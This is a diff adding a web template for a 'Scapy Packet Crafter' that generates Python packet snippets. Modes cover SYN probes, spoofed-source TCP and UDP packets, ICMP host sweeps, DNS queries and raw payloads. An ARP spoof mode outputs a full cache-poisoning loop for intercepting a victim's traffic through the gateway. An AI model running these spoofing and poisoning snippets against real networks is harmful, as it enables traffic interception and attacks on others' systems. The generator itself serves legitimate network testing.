@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Scapy Packet Crafter — Vantage</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Syne:wght@700;800&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --bg:#080a12;--s1:#0d0f1c;--s2:#121525;--s3:#191d31;
+      --border:#1e2240;--border-hi:#2d3260;
+      --text:#dde1f5;--text-dim:#6b7099;--text-faint:#373b5c;
+      --accent:#6366f1;--accent-hi:#818cf8;--accent-glow:#6366f133;
+      --radius:12px;
+    }
+    body { background:var(--bg);color:var(--text);font-family:'Inter',system-ui,sans-serif;font-size:14px;line-height:1.6;display:flex; }
+
+    .bg-layer{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden;}
+    .blob{position:absolute;border-radius:50%;filter:blur(100px);}
+    .blob-1{width:700px;height:700px;background:radial-gradient(circle,#3730a314,transparent 70%);top:-250px;left:-100px;}
+    .blob-2{width:500px;height:500px;background:radial-gradient(circle,#7c3aed10,transparent 70%);bottom:-150px;right:-80px;}
+    .grid-ov{position:fixed;inset:0;z-index:0;pointer-events:none;background-image:radial-gradient(circle,#6366f112 1px,transparent 1px);background-size:32px 32px;mask-image:radial-gradient(ellipse 80% 80% at 50% 50%,black 40%,transparent 100%)}
+
+    .main{position:relative;z-index:1;flex:1;min-width:0;padding:0 0 100px;margin-left:60px;}
+
+    .page-header{position:sticky;top:0;z-index:50;background:linear-gradient(180deg,var(--bg) 80%,transparent);padding:24px 40px 16px;}
+    .header-top{display:flex;align-items:center;gap:16px;margin-bottom:4px;}
+    .back-link{display:inline-flex;align-items:center;gap:6px;text-decoration:none;color:var(--text-faint);font-size:0.78rem;transition:color 0.15s;}
+    .back-link:hover{color:var(--text-dim);}
+    .page-title{font-family:'Syne',sans-serif;font-size:1.4rem;font-weight:800;letter-spacing:0.04em;}
+    .page-sub{font-size:0.78rem;color:var(--text-dim);}
+
+    .content{max-width:960px;padding:16px 40px 0;}
+    @media(max-width:700px){.content{padding:12px 16px 0;}.page-header{padding:16px;}}
+
+    .section-label{font-size:0.7rem;font-weight:700;letter-spacing:0.12em;text-transform:uppercase;color:var(--text-faint);margin-bottom:10px;}
+
+    /* Mode tabs */
+    .mode-tabs{display:flex;gap:6px;margin-bottom:20px;flex-wrap:wrap;}
+    .mode-tab{
+      padding:7px 16px;border-radius:9px;
+      border:1.5px solid var(--border);background:var(--s1);
+      color:var(--text-dim);font-size:0.78rem;font-weight:500;
+      cursor:pointer;transition:all 0.15s;
+    }
+    .mode-tab:hover{border-color:var(--border-hi);color:var(--text);}
+    .mode-tab.active{border-color:var(--accent);color:var(--accent-hi);background:var(--accent-glow);}
+
+    /* Builder card */
+    .builder-card{background:var(--s1);border:1.5px solid var(--border);border-radius:var(--radius);padding:24px;margin-bottom:20px;}
+
+    .field-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:12px;margin-bottom:20px;}
+    .field{display:flex;flex-direction:column;gap:5px;}
+    .field label{font-size:0.72rem;color:var(--text-dim);font-weight:500;}
+    .field input,.field select{
+      background:var(--s2);border:1.5px solid var(--border);border-radius:8px;
+      padding:8px 10px;color:var(--text);font-family:'Fira Code',monospace;font-size:0.8rem;
+      outline:none;transition:border-color 0.15s;
+    }
+    .field input:focus,.field select:focus{border-color:var(--accent);}
+    .field input::placeholder{color:var(--text-faint);}
+
+    .flag-row{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:20px;}
+    .flag-btn{
+      display:inline-flex;align-items:center;gap:6px;
+      padding:5px 12px;border-radius:8px;
+      border:1.5px solid var(--border);background:var(--s2);
+      color:var(--text-dim);font-size:0.72rem;font-family:'Fira Code',monospace;
+      cursor:pointer;transition:all 0.15s;user-select:none;
+    }
+    .flag-btn:hover{border-color:var(--border-hi);color:var(--text);}
+    .flag-btn.active{border-color:var(--accent);color:var(--accent-hi);background:var(--accent-glow);}
+
+    /* form panels per mode */
+    .mode-panel{display:none;}
+    .mode-panel.active{display:block;}
+
+    /* Output */
+    .output-wrap{background:var(--s1);border:1.5px solid var(--border);border-radius:var(--radius);overflow:hidden;}
+    .output-header{display:flex;align-items:center;justify-content:space-between;padding:10px 16px;border-bottom:1px solid var(--border);}
+    .output-label{font-size:0.7rem;font-weight:700;letter-spacing:0.1em;text-transform:uppercase;color:var(--text-dim);display:flex;align-items:center;gap:8px;}
+    .lang-badge{font-size:0.65rem;background:var(--accent-glow);border:1px solid var(--accent);color:var(--accent-hi);border-radius:5px;padding:1px 7px;}
+    .copy-btn{
+      font-size:0.7rem;color:var(--text-faint);background:none;border:1px solid var(--border);
+      border-radius:6px;padding:3px 10px;cursor:pointer;transition:all 0.15s;font-family:inherit;
+    }
+    .copy-btn:hover{color:var(--text);border-color:var(--border-hi);}
+    pre.output-code{
+      padding:16px;font-family:'Fira Code',monospace;font-size:0.8rem;
+      color:var(--text);overflow-x:auto;white-space:pre;min-height:80px;
+      line-height:1.6;
+    }
+    .kw{color:#818cf8;} .fn{color:#22d3ee;} .str{color:#a3e635;} .cmt{color:#4b5563;} .num{color:#f59e0b;}
+  </style>
+</head>
+<body>
+  <div class="bg-layer"><div class="blob blob-1"></div><div class="blob blob-2"></div></div>
+  <div class="grid-ov"></div>
+
+  {% include '_nav.html' %}
+
+  <main class="main">
+    <div class="page-header">
+      <div class="header-top">
+        <a href="/generators" class="back-link">← Generators</a>
+        <div>
+          <div class="page-title">Scapy Packet Crafter</div>
+          <div class="page-sub">Generate Python snippets for crafting and sending packets with Scapy</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="content">
+      <div class="section-label">Packet type</div>
+      <div class="mode-tabs" id="modeTabs">
+        <button class="mode-tab active" data-mode="tcp_syn">TCP SYN</button>
+        <button class="mode-tab" data-mode="tcp_custom">TCP Custom</button>
+        <button class="mode-tab" data-mode="udp">UDP</button>
+        <button class="mode-tab" data-mode="icmp">ICMP Probe</button>
+        <button class="mode-tab" data-mode="dns">DNS Query</button>
+        <button class="mode-tab" data-mode="arp_spoof">ARP Spoof</button>
+        <button class="mode-tab" data-mode="raw">Raw Payload</button>
+      </div>
+
+      <div class="builder-card">
+
+        <!-- TCP SYN -->
+        <div class="mode-panel active" id="panel_tcp_syn">
+          <div class="field-grid">
+            <div class="field"><label>Target IP</label><input id="tcp_syn_dst" placeholder="192.168.1.1" oninput="build()" /></div>
+            <div class="field"><label>Destination port</label><input id="tcp_syn_dport" placeholder="80" oninput="build()" /></div>
+            <div class="field"><label>Source port (0=random)</label><input id="tcp_syn_sport" placeholder="0" oninput="build()" /></div>
+            <div class="field"><label>Count (0=loop)</label><input id="tcp_syn_count" placeholder="1" oninput="build()" /></div>
+            <div class="field"><label>Inter-packet delay (s)</label><input id="tcp_syn_inter" placeholder="0" oninput="build()" /></div>
+            <div class="field"><label>Interface</label><input id="tcp_syn_iface" placeholder="eth0" oninput="build()" /></div>
+          </div>
+        </div>
+
+        <!-- TCP Custom flags -->
+        <div class="mode-panel" id="panel_tcp_custom">
+          <div class="field-grid">
+            <div class="field"><label>Target IP</label><input id="tcp_c_dst" placeholder="192.168.1.1" oninput="build()" /></div>
+            <div class="field"><label>Destination port</label><input id="tcp_c_dport" placeholder="443" oninput="build()" /></div>
+            <div class="field"><label>Source IP (spoof)</label><input id="tcp_c_src" placeholder="10.0.0.1" oninput="build()" /></div>
+            <div class="field"><label>Source port</label><input id="tcp_c_sport" placeholder="12345" oninput="build()" /></div>
+          </div>
+          <div class="section-label">TCP Flags</div>
+          <div class="flag-row" id="flagRow_tcp_custom">
+            <button class="flag-btn active" data-flag="S" onclick="toggleFlag(this)">SYN (S)</button>
+            <button class="flag-btn" data-flag="A" onclick="toggleFlag(this)">ACK (A)</button>
+            <button class="flag-btn" data-flag="F" onclick="toggleFlag(this)">FIN (F)</button>
+            <button class="flag-btn" data-flag="R" onclick="toggleFlag(this)">RST (R)</button>
+            <button class="flag-btn" data-flag="P" onclick="toggleFlag(this)">PSH (P)</button>
+            <button class="flag-btn" data-flag="U" onclick="toggleFlag(this)">URG (U)</button>
+          </div>
+          <div class="field-grid">
+            <div class="field"><label>Payload (string)</label><input id="tcp_c_payload" placeholder="Hello" oninput="build()" /></div>
+            <div class="field"><label>Count</label><input id="tcp_c_count" placeholder="1" oninput="build()" /></div>
+          </div>
+        </div>
+
+        <!-- UDP -->
+        <div class="mode-panel" id="panel_udp">
+          <div class="field-grid">
+            <div class="field"><label>Target IP</label><input id="udp_dst" placeholder="192.168.1.1" oninput="build()" /></div>
+            <div class="field"><label>Destination port</label><input id="udp_dport" placeholder="53" oninput="build()" /></div>
+            <div class="field"><label>Source IP (spoof)</label><input id="udp_src" placeholder="" oninput="build()" /></div>
+            <div class="field"><label>Payload (string)</label><input id="udp_payload" placeholder="\\x00\\x01" oninput="build()" /></div>
+            <div class="field"><label>Count</label><input id="udp_count" placeholder="1" oninput="build()" /></div>
+          </div>
+        </div>
+
+        <!-- ICMP -->
+        <div class="mode-panel" id="panel_icmp">
+          <div class="field-grid">
+            <div class="field"><label>Target IP / CIDR</label><input id="icmp_dst" placeholder="192.168.1.0/24" oninput="build()" /></div>
+            <div class="field"><label>ICMP type</label>
+              <select id="icmp_type" onchange="build()">
+                <option value="8">8 — Echo Request (ping)</option>
+                <option value="0">0 — Echo Reply</option>
+                <option value="3">3 — Destination Unreachable</option>
+                <option value="11">11 — Time Exceeded</option>
+                <option value="13">13 — Timestamp Request</option>
+              </select>
+            </div>
+            <div class="field"><label>Payload size (bytes)</label><input id="icmp_size" placeholder="64" oninput="build()" /></div>
+            <div class="field"><label>Count</label><input id="icmp_count" placeholder="3" oninput="build()" /></div>
+          </div>
+        </div>
+
+        <!-- DNS -->
+        <div class="mode-panel" id="panel_dns">
+          <div class="field-grid">
+            <div class="field"><label>DNS server IP</label><input id="dns_server" placeholder="8.8.8.8" oninput="build()" /></div>
+            <div class="field"><label>Query name</label><input id="dns_qname" placeholder="target.example.com" oninput="build()" /></div>
+            <div class="field"><label>Query type</label>
+              <select id="dns_qtype" onchange="build()">
+                <option value="A">A</option>
+                <option value="AAAA">AAAA</option>
+                <option value="MX">MX</option>
+                <option value="TXT">TXT</option>
+                <option value="NS">NS</option>
+                <option value="CNAME">CNAME</option>
+                <option value="ANY">ANY</option>
+              </select>
+            </div>
+          </div>
+        </div>
+
+        <!-- ARP Spoof -->
+        <div class="mode-panel" id="panel_arp_spoof">
+          <div class="field-grid">
+            <div class="field"><label>Victim IP</label><input id="arp_victim" placeholder="192.168.1.10" oninput="build()" /></div>
+            <div class="field"><label>Gateway IP (to spoof)</label><input id="arp_gateway" placeholder="192.168.1.1" oninput="build()" /></div>
+            <div class="field"><label>Interval (s)</label><input id="arp_interval" placeholder="2" oninput="build()" /></div>
+          </div>
+        </div>
+
+        <!-- Raw -->
+        <div class="mode-panel" id="panel_raw">
+          <div class="field-grid">
+            <div class="field"><label>Target IP</label><input id="raw_dst" placeholder="192.168.1.1" oninput="build()" /></div>
+            <div class="field"><label>Protocol #</label><input id="raw_proto" placeholder="253" oninput="build()" /></div>
+            <div class="field"><label>Payload (hex or string)</label><input id="raw_payload" placeholder="\\x41\\x41\\x41\\x41" oninput="build()" /></div>
+            <div class="field"><label>Count</label><input id="raw_count" placeholder="1" oninput="build()" /></div>
+          </div>
+        </div>
+
+      </div>
+
+      <!-- Output -->
+      <div class="output-wrap">
+        <div class="output-header">
+          <span class="output-label">Python snippet <span class="lang-badge">Scapy</span></span>
+          <button class="copy-btn" onclick="copySnippet()">Copy</button>
+        </div>
+        <pre class="output-code" id="snippetOut"></pre>
+      </div>
+    </div>
+  </main>
+
+  <div class="toast-container" id="toastContainer"></div>
+
+  <script>
+  let currentMode = 'tcp_syn';
+
+  document.querySelectorAll('.mode-tab').forEach(tab => {
+    tab.addEventListener('click', () => {
+      document.querySelectorAll('.mode-tab').forEach(t => t.classList.remove('active'));
+      document.querySelectorAll('.mode-panel').forEach(p => p.classList.remove('active'));
+      tab.classList.add('active');
+      currentMode = tab.dataset.mode;
+      document.getElementById('panel_' + currentMode).classList.add('active');
+      build();
+    });
+  });
+
+  function toggleFlag(btn) { btn.classList.toggle('active'); build(); }
+
+  function g(id) { return (document.getElementById(id)?.value || '').trim(); }
+
+  function hl(code) {
+    return code
+      .replace(/\b(from|import|for|while|True|False|None|if|else|in|not|and|or|def|return|try|except|with|as)\b/g, '<span class="kw">$1</span>')
+      .replace(/\b(send|sendp|sr1|srp|IP|TCP|UDP|ICMP|DNS|DNSQR|Ether|ARP|Raw|ls|hexdump|sleep|range|print)\b/g, '<span class="fn">$1</span>')
+      .replace(/"([^"]*)"/g, '<span class="str">"$1"</span>')
+      .replace(/'([^']*)'/g, '<span class="str">\'$1\'</span>')
+      .replace(/#.*$/gm, '<span class="cmt">$&</span>')
+      .replace(/\b(\d+)\b/g, '<span class="num">$1</span>');
+  }
+
+  function build() {
+    let code = '';
+    const m = currentMode;
+
+    if (m === 'tcp_syn') {
+      const dst    = g('tcp_syn_dst')    || '192.168.1.1';
+      const dport  = g('tcp_syn_dport')  || '80';
+      const sport  = g('tcp_syn_sport');
+      const count  = parseInt(g('tcp_syn_count')) || 1;
+      const inter  = parseFloat(g('tcp_syn_inter')) || 0;
+      const iface  = g('tcp_syn_iface');
+      const sportStr = sport && sport !== '0' ? `sport=${sport}, ` : 'sport=RandShort(), ';
+      const extras = [];
+      if (count > 1) extras.push(`count=${count}`);
+      if (inter > 0) extras.push(`inter=${inter}`);
+      if (iface) extras.push(`iface="${iface}"`);
+      const sendExtra = extras.length ? ', ' + extras.join(', ') : '';
+      code = `from scapy.all import *\n\npkt = IP(dst="${dst}") / TCP(${sportStr}dport=${dport}, flags="S")\nsend(pkt${sendExtra})\n\n# Capture response\nans, _ = sr(pkt, timeout=2${sendExtra.replace('count=','')})${extras.length && !extras[0].includes('count') ? '' : ''}\nfor s, r in ans:\n    print(f"[+] {r[IP].src}:{r[TCP].sport} → {r[TCP].flags}")`;
+
+    } else if (m === 'tcp_custom') {
+      const dst    = g('tcp_c_dst')     || '192.168.1.1';
+      const dport  = g('tcp_c_dport')   || '443';
+      const src    = g('tcp_c_src');
+      const sport  = g('tcp_c_sport')   || '12345';
+      const payload = g('tcp_c_payload');
+      const count  = parseInt(g('tcp_c_count')) || 1;
+      const flags  = [...document.querySelectorAll('#flagRow_tcp_custom .flag-btn.active')].map(b => b.dataset.flag).join('') || 'S';
+      const ipLayer = src ? `IP(src="${src}", dst="${dst}")` : `IP(dst="${dst}")`;
+      const payloadStr = payload ? ` / Raw(load="${payload}")` : '';
+      code = `from scapy.all import *\n\npkt = ${ipLayer} / TCP(sport=${sport}, dport=${dport}, flags="${flags}")${payloadStr}\nsend(pkt, count=${count})`;
+
+    } else if (m === 'udp') {
+      const dst     = g('udp_dst')     || '192.168.1.1';
+      const dport   = g('udp_dport')   || '53';
+      const src     = g('udp_src');
+      const payload = g('udp_payload');
+      const count   = parseInt(g('udp_count')) || 1;
+      const ipLayer = src ? `IP(src="${src}", dst="${dst}")` : `IP(dst="${dst}")`;
+      const payloadStr = payload ? ` / Raw(load="${payload}")` : '';
+      code = `from scapy.all import *\n\npkt = ${ipLayer} / UDP(dport=${dport})${payloadStr}\nsend(pkt, count=${count})`;
+
+    } else if (m === 'icmp') {
+      const dst    = g('icmp_dst')   || '192.168.1.1';
+      const type   = g('icmp_type')  || '8';
+      const size   = parseInt(g('icmp_size'))  || 64;
+      const count  = parseInt(g('icmp_count')) || 3;
+      const pad    = Math.max(0, size - 8);
+      code = `from scapy.all import *\n\ntargets = Net("${dst}")\n\nfor t in targets:\n    pkt = IP(dst=t) / ICMP(type=${type}) / (b"A" * ${pad})\n    ans, _ = sr(pkt, timeout=1, count=${count})\n    for s, r in ans:\n        print(f"[+] {r[IP].src} is up (RTT: {r.time - s.sent_time:.2f}s)")`;
+
+    } else if (m === 'dns') {
+      const server = g('dns_server') || '8.8.8.8';
+      const qname  = g('dns_qname')  || 'example.com';
+      const qtype  = g('dns_qtype')  || 'A';
+      code = `from scapy.all import *\n\npkt = IP(dst="${server}") / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="${qname}.", qtype="${qtype}"))\nresp = sr1(pkt, verbose=0, timeout=3)\n\nif resp and resp.haslayer(DNS):\n    for i in range(resp[DNS].ancount):\n        print(resp[DNS].an[i].rdata)`;
+
+    } else if (m === 'arp_spoof') {
+      const victim   = g('arp_victim')   || '192.168.1.10';
+      const gateway  = g('arp_gateway')  || '192.168.1.1';
+      const interval = parseFloat(g('arp_interval')) || 2;
+      code = `from scapy.all import *\nimport time\n\ndef get_mac(ip):\n    arp = ARP(pdst=ip)\n    ether = Ether(dst="ff:ff:ff:ff:ff:ff")\n    ans, _ = srp(ether / arp, timeout=3, verbose=0)\n    return ans[0][1].hwsrc\n\nvictim_ip  = "${victim}"\ngateway_ip = "${gateway}"\nvictim_mac  = get_mac(victim_ip)\ngateway_mac = get_mac(gateway_ip)\n\nprint(f"[*] Poisoning {victim_ip} (MAC: {victim_mac})")\nprint(f"[*] Spoofing  {gateway_ip} (MAC: {gateway_mac})")\n\ntry:\n    while True:\n        # Tell victim: we are the gateway\n        send(ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip), verbose=0)\n        # Tell gateway: we are the victim\n        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip), verbose=0)\n        time.sleep(${interval})\nexcept KeyboardInterrupt:\n    print("\\n[!] Restoring ARP tables...")\n    send(ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=gateway_mac), count=5, verbose=0)\n    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip, hwsrc=victim_mac), count=5, verbose=0)`;
+
+    } else if (m === 'raw') {
+      const dst     = g('raw_dst')     || '192.168.1.1';
+      const proto   = g('raw_proto')   || '253';
+      const payload = g('raw_payload') || '\\x41\\x41\\x41\\x41';
+      const count   = parseInt(g('raw_count')) || 1;
+      code = `from scapy.all import *\n\npkt = IP(dst="${dst}", proto=${proto}) / Raw(load="${payload}")\nsend(pkt, count=${count})`;
+    }
+
+    document.getElementById('snippetOut').innerHTML = hl(code);
+  }
+
+  function copySnippet() {
+    const raw = document.getElementById('snippetOut').textContent;
+    navigator.clipboard.writeText(raw).then(() => showToast('Python snippet copied', 'success'));
+  }
+
+  /* toast */
+  function showToast(msg, type) {
+    const c = document.getElementById('toastContainer');
+    const t = document.createElement('div');
+    t.className = 'vt' + (type ? ' ' + type : '');
+    t.innerHTML = `<i class="vt-icon">${type === 'success' ? '✓' : 'ℹ'}</i><span>${msg}</span>`;
+    c.appendChild(t);
+    requestAnimationFrame(() => { requestAnimationFrame(() => t.classList.add('show')); });
+    setTimeout(() => { t.classList.remove('show'); setTimeout(() => t.remove(), 350); }, 2500);
+  }
+
+  build();
+  </script>
+</body>
+</html>
